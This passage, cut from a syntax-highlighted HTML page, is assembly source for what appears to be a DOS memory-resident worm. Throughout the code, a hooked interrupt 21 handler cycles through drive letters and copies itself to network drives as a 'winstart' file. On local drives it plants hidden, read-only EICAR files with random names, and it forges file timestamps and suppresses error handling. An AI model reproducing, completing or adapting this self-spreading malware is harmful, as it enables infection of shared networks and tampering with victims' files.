                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_24</span><span class="sc0">  </span><span class="sc1">;our handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;get drive to infect</span><span class="sc0">
</span><span class="sc5">next_drive</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">drive_number</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">27</span><span class="sc0">                   </span><span class="sc1">;is it past drive Z: ?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">save_letter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">save_letter</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;inc and save for next time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">drive_number</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">check_next</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4409h</span><span class="sc0">                </span><span class="sc1">;see if network or local drive</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">next_drive</span><span class="sc0">              </span><span class="sc1">;if neither get next drive</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"@"</span><span class="sc0">                  </span><span class="sc1">;save drive letter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">winstart_file</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">eicar_drive</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">;test for network</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">eicar_dropper</span><span class="sc0">           </span><span class="sc1">;if local then drop EICARs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">password1</span><span class="sc0">     </span><span class="sc1">;create new cypher text file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">password2</span><span class="sc0">     </span><span class="sc1">;to be made from winstart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">random_file1</span><span class="sc0">  </span><span class="sc1">;random file name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">random_file2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">
                </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">          </span><span class="sc1">;and random extension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_file</span><span class="sc0">    </span><span class="sc1">;random file name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_dev_name</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">cmpsw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">          </span><span class="sc1">;and more random name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winstart_file</span><span class="sc0"> </span><span class="sc1">;create worm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win_dev_name</span><span class="sc0">  </span><span class="sc1">;disable nul-space driver</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">                  </span><span class="sc1">;create new file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;normal attributes</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc3">"W"</span><span class="sc0">    </span><span class="sc1">;set nul-space driver back</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">unable_infect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                </span><span class="sc1">;point to start of winstart</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">previous_hook</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">        </span><span class="sc1">;create file</span><span class="sc0">
</span><span class="sc5">eicar_dropper</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_ext</span><span class="sc0">     </span><span class="sc1">;create EICAR file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;random extension</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_random3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_dev_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">                  </span><span class="sc1">;create new file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">     </span><span class="sc1">;disable nul-space driver</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_drive</span><span class="sc0">   </span><span class="sc1">;point to file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                  </span><span class="sc1">;readonly, hidden and system</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">    </span><span class="sc1">;enable nul-space again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;point to EICAR file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eicar_length</span><span class="sc4">-</span><span class="sc5">eicar</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;write EICAR or winstart file </span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">;set date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">229fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">;close it</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">unable_infect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">;done</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;set critical error back</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">not_infect_now</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">pop_it</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">pop_ds_and_all</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
</span><span class="sc5">resident_isr21</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">far_jmp</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">previous_hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc5">double</span><span class="sc0">                  </span><span class="sc1">;previous interrupt 21</span><span class="sc0">
</span><span class="sc5">far_jmp</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">tail</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">qseg</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
